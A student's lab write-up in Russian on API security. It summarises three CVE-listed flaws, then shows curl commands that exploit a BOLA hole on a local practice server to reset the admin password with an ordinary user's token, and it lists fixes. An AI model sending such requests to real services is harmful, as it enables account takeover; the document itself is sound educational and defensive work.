# Лабораторная работа №2
## Часть 1
1. Broken Object Level Authorization (BOLA)
Источник: https://nvd.nist.gov/vuln/detail/CVE-2025-23325
Недостаток: любой пользователь может получить доступ к чужим данным, просто подменив идентификатор объекта в url-запросе
Причина: отсутствие проверки прав доступа на уровне объекта. сервер не проверяет имеет ли пользователь право на доступ к конкретному файлу

2. Broken User Authentication
Источник: https://nvd.nist.gov/vuln/detail/CVE-2025-20348
Недостаток: можно было войти в систему администратора без пароля просто отправив специальный запрос
Причина: ошибка в логике обработки цепочки аутентификации. специально сформированный запрос воспринимается сервером как корректный запрос

3. Unrestricted Resource Consumption
Источник: https://nvd.nist.gov/vuln/detail/CVE-2025-49559
Недостаток: возможность вызова отказа в обслуживании через манипуляцию сериализацией классов в api.
Причина: отсутствие лимитов на потребление ресурсов при обработке входящих данных. запрос приводит к исчерпанию памяти сервера

## Часть 2

### какие эндпоинты
изучила главную страницу http://localhost:8080/ 
![alt text](image-1.png)
нашла подозрительный метод изменения пароля, доступный по шаблону:
"изменить пароль пользователя": "/users/v1/{username}/password (HTTP PUT)"

### ход решения
1. зарегистрировала пользователя user1.
команда: 
curl -X POST http://localhost:8080/users/v1/register \
-H "Content-Type: application/json" \
-d '{"username": "user1", "password": "12345", "email": "user1@test.com"}'

2. вход и получаю токен.
команда: 
curl -s -X POST http://localhost:8080/users/v1/login \
-H "Content-Type: application/json" \
-d '{"username": "user1", "password": "12345"}'
#### токен: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzY1NDE1NTAsImlhdCI6MTc3NjU0MTQ5MCwic3ViIjoidXNlcjEifQ.-uKb5p1-j-kjzRLD0AH7bXhjDjArC6MHUuH-5X0Tizw

3. меняю пароль админу
команда: 
curl -v -X PUT http://localhost:8080/users/v1/admin/password \
-H "Content-Type: application/json" \
-H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzY1NDE1NTAsImlhdCI6MTc3NjU0MTQ5MCwic3ViIjoidXNlcjEifQ.-uKb5p1-j-kjzRLD0AH7bXhjDjArC6MHUuH-5X0Tizw" \
-d '{"password": "new_123"}'
![alt text](image-2.png)
сервер ответил кодом 204 No Content. 
запрос выполнен успешно. пароль админа был изменен.

#### вывод:
найденная уязвимость:
удалось изменить пароль другого пользователя (администратора), не имея на это прав

тип уязвимости:API1:2023 — Broken Object Level Authorization (BOLA)

меры предотвращения:
1. внедрить проверку прав доступа. перед выполнением действия сервер должен сверять id текущего пользователя и владельца ресурса
2. закрыть доступ к смене пароля строгой проверкой роли и принадлежности ресурса